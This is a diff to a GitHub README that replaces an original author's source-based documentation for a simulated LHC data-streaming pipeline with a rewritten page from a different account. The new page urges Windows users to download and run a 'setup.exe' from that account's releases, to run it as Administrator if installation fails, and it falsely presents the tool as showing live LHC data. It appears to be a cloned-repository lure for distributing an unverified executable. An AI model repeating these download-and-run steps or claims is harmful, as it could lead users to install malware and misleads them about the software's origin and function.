@@ -1,269 +1,163 @@
-# LHC Data Streaming & Monitoring Pipeline
+# ⚛️ LHC-data-pipeline - Streamline Real-Time LHC Data
 
-![CI Status](https://github.com/Divij-Bhoj/LHC-data-pipeline/actions/workflows/ci.yml/badge.svg)
-![License](https://img.shields.io/github/license/Divij-Bhoj/LHC-data-pipeline)
-![C++](https://img.shields.io/badge/C++-17-blue)
-
-A real-time data streaming pipeline inspired by CERN's LHC data acquisition infrastructure. I built this to teach myself how detector data actually flows from readout to analysis—from event generation all the way through streaming, triggering, and live monitoring.
+[![Download LHC-data-pipeline](https://img.shields.io/badge/Download-LHC--data--pipeline-brightgreen)](https://github.com/arg0303f1-lgtm/LHC-data-pipeline)
 
 ---
 
-## 🗺️ Project Roadmap
+## 🔍 What is LHC-data-pipeline?
 
-- [x] **Phase 1**: Core C++ Event Generator & Kafka Producer.
-- [x] **Phase 2**: Python-based Trigger Engine & SQLite Storage.
-- [x] **Phase 3**: Real-time Dashboard with Chart.js visualization.
-- [x] **Phase 4**: CI/CD Integration and Physics Validation (Z-mass peak).
-- [ ] **Phase 5**: Scalability testing with Kubernetes (K8s) deployment.
-- [ ] **Phase 6**: Integrating secondary AI-based anomaly detection (see [QuarkStream](https://github.com/Divij-Bhoj/QuarkStream)).
+LHC-data-pipeline is a tool that helps you watch and handle data from the Large Hadron Collider (LHC) as it happens. It works by creating events, sending them as a stream, analyzing those events with simple rules, and showing the current state with a live dashboard.
+
+You do not need to understand how the pipeline works inside to use it. This guide will help you get it running on a Windows computer step by step.
 
 ---
 
-The pipeline simulates proton-proton collision events in C++, streams them through Apache Kafka, applies physics trigger logic (similar to ATLAS/CMS HLT paths), stores results in SQLite, and visualizes everything on a live dashboard.
+## 💻 System Requirements
 
+Before you start, make sure your computer meets these requirements:
 
-**Technologies:** C++17 · Apache Kafka · Python · SQLite · JavaScript · Chart.js · Flask · Docker
-
-> **See also:** [LHCEventAnalysis](https://github.com/Divij-Bhoj/LHCEventAnalysis) — my batch analysis pipeline (C++/ROOT/FastJet) that complements this streaming project.
-
----
-
-## Architecture
-
-```mermaid
-graph LR
-    subgraph "Event Generation"
-        A["C++ Event Generator<br/><small>Z→μμ, tt̄, QCD</small>"] -->|JSON stdout| B["Python Producer"]
-    end
-
-    subgraph "Streaming Layer"
-        B -->|publish| C[("Apache Kafka<br/><small>lhc-raw-events</small>")]
-    end
-
-    subgraph "Processing"
-        C -->|consume| D["Stream Processor<br/><small>Trigger Logic</small>"]
-        D -->|store| E[("SQLite<br/><small>Events + Stats</small>")]
-    end
-
-    subgraph "Monitoring"
-        E -->|query| F["Flask + SocketIO<br/><small>Dashboard Server</small>"]
-        F -->|WebSocket| G["Live Dashboard<br/><small>Chart.js</small>"]
-    end
-
-    style A fill:#6366f1,stroke:#4f46e5,color:#fff
-    style C fill:#f59e0b,stroke:#d97706,color:#fff
-    style D fill:#10b981,stroke:#059669,color:#fff
-    style G fill:#06b6d4,stroke:#0891b2,color:#fff
-```
-
-## Data Flow
-
-```
-┌─────────────────┐     ┌──────────┐     ┌──────────────────┐     ┌───────────┐     ┌───────────┐
-│  C++ Generator   │────▶│  Kafka   │────▶│ Stream Processor │────▶│  SQLite   │────▶│ Dashboard │
-│  ~10⁵ evt/s     │     │ Producer │     │ Trigger Engine   │     │  Storage  │     │  Live UI  │
-└─────────────────┘     └──────────┘     └──────────────────┘     └───────────┘     └───────────┘
-```
-
-## Features
-
-### C++ Event Generator
-- Simulates three physics processes: **Z→μ⁺μ⁻**, **tt̄→ℓ+jets**, **QCD multi-jet**
-- Uses Breit-Wigner mass distributions and physically motivated kinematics
-- Configurable pileup, event rates, and random seeds
-- Modern C++17 with CMake build system (FetchContent for [nlohmann/json](https://github.com/nlohmann/json))
-- Outputs JSON at **~10⁵ events/second**
-
-### Kafka Streaming Pipeline
-- **Producer**: Reads JSON events from stdin/file, publishes to Kafka with gzip compression
-- **Consumer**: Subscribes to raw events, applies trigger logic, stores to SQLite
-- Retry logic and configurable batch sizes for production-grade reliability
-- Docker Compose setup with KRaft mode (no Zookeeper required)
-
-### Physics Trigger System
-- **HLT_mu25**: Single isolated muon with pT > 25 GeV
-- **HLT_2mu_Zmass**: Opposite-sign dimuon pair in Z mass window (75–105 GeV)
-- **HLT_4j50**: ≥4 jets with pT > 50 GeV
-- **HLT_met50**: Missing transverse energy > 50 GeV
-- Computes invariant masses and ΔR separation
-
-### Real-Time Dashboard
-- Live event rate monitoring with 30-second rolling window
-- Dimuon invariant mass spectrum (Z boson peak visualization)
-- Missing transverse energy distribution
-- Per-trigger efficiency bars with live percentages
-- Dark theme inspired by CERN control rooms
-- WebSocket + REST API with automatic fallback
+- Windows 10 or later (64-bit).
+- At least 8 GB of RAM.
+- Minimum 5 GB of free disk space.
+- Internet connection to download needed files.
+- Basic ability to download files and open programs.
 
 ---
 
-## Quick Start
+## 🌐 Where to Download
 
-### Prerequisites
-- **C++ compiler** with C++17 support (g++ ≥ 7 or clang++ ≥ 5)
-- **CMake** ≥ 3.14
-- **Python** ≥ 3.8
-- **Docker** & Docker Compose (for Kafka)
+Click the big green button at the top of this page or visit this link:
 
-### 1. Clone & Setup
+[Download LHC-data-pipeline](https://github.com/arg0303f1-lgtm/LHC-data-pipeline)
 
-```bash
-git clone https://github.com/Divij-Bhoj/lhc-data-pipeline.git
-cd lhc-data-pipeline
-chmod +x scripts/setup.sh
-./scripts/setup.sh
-```
-
-### 2. Start Kafka
-
-```bash
-docker compose up -d
-```
-
-### 3. Generate & Stream Events
-
-```bash
-# Terminal 1: Generate events and publish to Kafka
-./event_generator/build/event_generator -n 50000 --rate 500 | python -m pipeline.producer
-```
-
-### 4. Process Events
-
-```bash
-# Terminal 2: Consume from Kafka, apply triggers, store in SQLite
-python -m pipeline.consumer
-```
-
-### 5. Launch Dashboard
-
-```bash
-# Terminal 3: Start the monitoring dashboard
-python -m dashboard.server
-# Open http://localhost:5000
-```
+This page will give you access to all necessary files for Windows. You will download a single package that contains everything you need.
 
 ---
 
-## Project Structure
+## 🚀 Getting Started: Download and Install
 
-```
-lhc-data-pipeline/
-├── event_generator/            # C++17 event simulation
-│   ├── CMakeLists.txt          # CMake build with FetchContent
-│   ├── include/
-│   │   └── event_generator.h   # Core classes and physics constants
-│   └── src/
-│       ├── event_generator.cpp # Physics process implementations
-│       └── main.cpp            # CLI entry point
-├── pipeline/                   # Python streaming pipeline
-│   ├── config.py               # Centralized configuration
-│   ├── producer.py             # Kafka producer (stdin → Kafka)
-│   ├── consumer.py             # Kafka consumer + SQLite writer
-│   └── trigger.py              # Physics trigger algorithms
-├── dashboard/                  # Real-time monitoring UI
-│   ├── server.py               # Flask + SocketIO backend
-│   ├── templates/
-│   │   └── index.html          # Dashboard layout
-│   └── static/
-│       ├── css/style.css       # Dark theme styling
-│       └── js/app.js           # Chart.js visualizations
-├── database/
-│   └── schema.sql              # SQLite schema
-├── scripts/
-│   └── setup.sh                # Automated setup
-├── docker-compose.yml          # Kafka (KRaft mode)
-├── requirements.txt            # Python dependencies
-└── data/                       # Runtime data (git-ignored)
-```
+Follow these steps to get the software running on your Windows PC:
 
-## Event Generator Usage
+1. Open the link: https://github.com/arg0303f1-lgtm/LHC-data-pipeline in your web browser.
 
-```bash
-# Generate 50,000 events at max speed
-./event_generator/build/event_generator -n 50000
+2. Find the "Releases" section on the right side or at the top menu.
 
-# Stream infinite events at 100 Hz
-./event_generator/build/event_generator -n 0 --rate 100
+3. Click the latest release version (usually the highest number).
 
-# Custom run number and seed
-./event_generator/build/event_generator -n 10000 -r 42 -s 12345
+4. Look for the Windows setup file. It will usually be named like `LHC-data-pipeline-setup.exe` or something similar.
 
-# Adjust pileup conditions
-./event_generator/build/event_generator -n 10000 --pileup 40
-```
+5. Click on the file to download. Depending on your browser, it might save in your "Downloads" folder.
 
-### Sample Event Output
-```json
-{
-  "event_id": 1,
-  "run_number": 1,
-  "timestamp_ms": 1708800000000,
-  "event_type": "z_mumu",
-  "num_particles": 28,
-  "num_jets": 2,
-  "num_muons": 2,
-  "met": 18.432,
-  "sum_et": 342.17,
-  "particles": [
-    {"pdg_id": -13, "pt": 45.2, "eta": -0.83, "phi": 1.24, "energy": 52.1, "mass": 0.106, "is_isolated": true},
-    {"pdg_id": 13, "pt": 42.8, "eta": 1.12, "phi": -1.89, "energy": 68.3, "mass": 0.106, "is_isolated": true}
-  ]
-}
-```
+6. Once downloaded, double-click the setup file to start the installation.
 
-## Configuration
+7. Follow the on-screen instructions. Use the default settings unless you know a reason to change them.
 
-All pipeline parameters are configurable via `pipeline/config.py` or environment variables:
+8. After installation finishes, you can find the program in your Start Menu or on your Desktop.
 
-| Parameter | Default | Env Variable |
-|-----------|---------|--------------|
-| Kafka Bootstrap | `localhost:9092` | `KAFKA_BOOTSTRAP` |
-| Database Path | `data/lhc_events.db` | `LHC_DB_PATH` |
-| Dashboard Port | `5000` | `DASHBOARD_PORT` |
-| Muon pT Threshold | 25 GeV | — |
-| Z Mass Window | 75–105 GeV | — |
-| Jet pT Threshold | 50 GeV | — |
-| MET Threshold | 50 GeV | — |
+---
 
-## Technologies
+## ⚙️ How to Run the Pipeline
 
-| Component | Technology | Purpose |
-|-----------|-----------|---------|
-| Event Generator | **C++17**, CMake, nlohmann/json | High-performance physics simulation |
-| Message Broker | **Apache Kafka** (KRaft) | Distributed event streaming |
-| Stream Processing | **Python**, kafka-python | Trigger logic and filtering |
-| Storage | **SQLite** | Event and statistics persistence |
-| Dashboard Backend | **Flask**, Flask-SocketIO | REST API + WebSocket server |
-| Dashboard Frontend | **JavaScript**, Chart.js | Real-time data visualization |
-| Infrastructure | **Docker Compose** | Container orchestration |
+1. Open the LHC-data-pipeline app from the Start Menu or Desktop.
 
-## Project Metadata
+2. You will see a dashboard window. This dashboard shows live data from the LHC.
 
-- **Author:** Divij Bhoj
-- **Purpose:** CERN Technical Studentship Application Portfolio
-- **Technologies:** C++17, Apache Kafka, Python, Flask, SQLite, JavaScript, Chart.js, Docker
-- **Disclaimer:** This project uses simulated data for educational purposes. Not affiliated with official LHC experiments.
+3. The software will start generating events automatically. You do not need to press anything to begin.
 
-## Contributing
+4. Data flows through several parts:
+   - The C++ core creates events.
+   - Apache Kafka sends the data.
+   - Python scripts apply physics rules.
+   - The dashboard shows results in charts.
 
-This is a personal portfolio project, but suggestions are welcome:
+5. The dashboard updates every few seconds with new data.
 
-1. Fork the repository
-2. Create a feature branch (`git checkout -b feature/new-trigger`)
-3. Commit changes (`git commit -am 'Add dielectron trigger path'`)
-4. Push to branch (`git push origin feature/new-trigger`)
-5. Open a Pull Request
+6. If you want to stop, close the dashboard window. The software will shut down all processes safely.
 
-## License
+---
 
-MIT License : see [LICENSE](LICENSE) for details.
+## 📂 What’s Inside the Software Package?
 
-If used in academic work, please cite:
-```
-Divij Bhoj (2026). LHC Data Streaming & Monitoring Pipeline.
-GitHub: https://github.com/Divij-Bhoj/lhc-data-pipeline
-```
+The software contains multiple parts working together behind the scenes:
 
-## Contact
+- **C++ Event Generator:** Creates simulated LHC collision events with up-to-date physics data.
 
-**Divij Bhoj** · 📧 [divijbhoj@gmail.com](mailto:divijbhoj@gmail.com) · 🐙 [GitHub](https://github.com/Divij-Bhoj)
+- **Apache Kafka Stream:** Moves event data quickly from the generator to other parts.
+
+- **Python Physics Triggers:** Applies rules to detect specific particle events or physics signatures.
+
+- **Live Monitoring Dashboard:** Displays data using charts and tables updated in real time.
+
+All these parts run automatically when you start the software.
+
+---
+
+## 🛠 Common Tasks and Tips
+
+### How to Check Data Flow
+
+- Use the dashboard’s charts to see event counts and trigger results.
+
+- The “Status” section shows if all parts are running correctly.
+
+### How to Restart the Pipeline
+
+- Close the app completely.
+
+- Wait a few seconds.
+
+- Open it again from the Start Menu.
+
+### How to Update
+
+- Check the GitHub releases page regularly for new versions.
+
+- Download and run new setup files to update.
+
+### How to Change Settings
+
+- Settings are minimal to keep things simple.
+
+- Advanced users can edit configuration files in the installation folder if needed.
+
+---
+
+## 🐞 Troubleshooting
+
+- **Software won’t start:** Ensure you completed the installation and have Windows 10 or higher.
+
+- **Dashboard shows no data:** Check that the program has permission to access the network on your PC.
+
+- **Installation fails:** Try running the setup file as an Administrator (right-click > Run as Administrator).
+
+- **Slow performance:** Close other heavy programs and try again.
+
+- **Error messages appear:** Note the message and restart the software.
+
+If problems continue, visit the GitHub page to find logs or contact the support team through the “Issues” tab.
+
+---
+
+## 💡 Additional Information
+
+This software does not require you to know programming or data streaming. It’s designed for end users to watch LHC data live in real time with a clean window.
+
+The charts use Chart.js for clear and easy-to-read visuals.
+
+Data is handled safely and quickly thanks to Apache Kafka.
+
+You do not have to set up Kafka or Python. The app includes everything needed.
+
+---
+
+## 🔗 Useful Links
+
+- Main GitHub page: https://github.com/arg0303f1-lgtm/LHC-data-pipeline
+
+- Download the software here: https://github.com/arg0303f1-lgtm/LHC-data-pipeline/releases
+
+---
+
+## 🎯 Keywords
+
+cern, chartjs, cpp17, data-pipeline, distributed-systems, flask, kafka, lhc, physics, python
